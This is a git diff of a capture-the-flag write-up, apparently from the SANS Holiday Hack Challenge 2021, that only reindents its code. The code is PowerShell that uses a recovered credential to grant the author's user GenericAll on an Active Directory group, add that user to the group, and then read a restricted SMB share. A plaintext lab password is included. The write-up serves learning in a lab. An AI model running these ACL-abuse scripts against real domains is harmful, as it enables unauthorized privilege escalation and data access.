@@ -46,39 +46,38 @@ $aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("el
 <h3 id="getting-into-group-research-department">Getting into group Research Department</h3>
 <p>With the <code>remote_elf</code> credential snippet from the script, we can grant our windows domain user the <code>GenericAll</code> permissions for the group Research Department:</p>
 <pre><code>Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock {
-Add-Type -AssemblyName System.DirectoryServices
-$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
-$username = "{userid}"
-$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
-$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
-$IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
-$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
-$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
-$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
-$secOptions = $domainDirEntry.get_Options()
-$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
-$domainDirEntry.RefreshCache()
-$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
-$domainDirEntry.CommitChanges()
-$domainDirEntry.dispose()
+  Add-Type -AssemblyName System.DirectoryServices
+  $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+  $username = "{userid}"
+  $nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
+  $propGUID = [guid]'00000000-0000-0000-0000-000000000000'
+  $IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
+  $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
+  $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
+  $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
+  $secOptions = $domainDirEntry.get_Options()
+  $secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
+  $domainDirEntry.RefreshCache()
+  $domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
+  $domainDirEntry.CommitChanges()
+  $domainDirEntry.dispose()
 } -Credential $aCred -Authentication Negotiate
 </code></pre>
 <p>and add then our user to this group:</p>
 <pre><code>Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock {
-Add-Type -AssemblyName System.DirectoryServices
-$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
-$username = "ptsuxvdegy"
-$password = "Scumpfccr#"
-$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
-$user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
-$sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
-$b=New-Object byte[] $sid.BinaryLength
-$sid.GetBinaryForm($b,0)
-$hexSID=[BitConverter]::ToString($b).Replace('-','')
-$domainDirEntry.Add("LDAP://&lt;SID=$hexSID&gt;")
-$domainDirEntry.CommitChanges()
-$domainDirEntry.dispose()
-
+  Add-Type -AssemblyName System.DirectoryServices
+  $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+  $username = "ptsuxvdegy"
+  $password = "Scumpfccr#"
+  $domainDirEntry = New-Object   System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
+  $user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
+  $sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
+  $b=New-Object byte[] $sid.BinaryLength
+  $sid.GetBinaryForm($b,0)
+  $hexSID=[BitConverter]::ToString($b).Replace('-','')
+  $domainDirEntry.Add("LDAP://&lt;SID=$hexSID&gt;")
+  $domainDirEntry.CommitChanges()
+  $domainDirEntry.dispose()
 } -Credential $aCred -Authentication Negotiate
 </code></pre>
 <h3 id="access-to-research_dep-share">Access to research_dep share</h3>
@@ -90,7 +89,6 @@ smb: \&gt; dir
   SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021
 
 		41089256 blocks of size 1024. 34373492 blocks available
-
 </code></pre>
 <p>The <a href="https://github.com/joergschwarzwaelder/hhc2021/blob/master/Objective-8/SantaSecretToAWonderfulHolidaySeason.pdf">PDF document</a> lists <strong>Kindness</strong> as first secret ingredient for a wonderful holiday season.</p>
 <h3 id="bonus-kerberoboting">Bonus: Kerberoboting</h3>
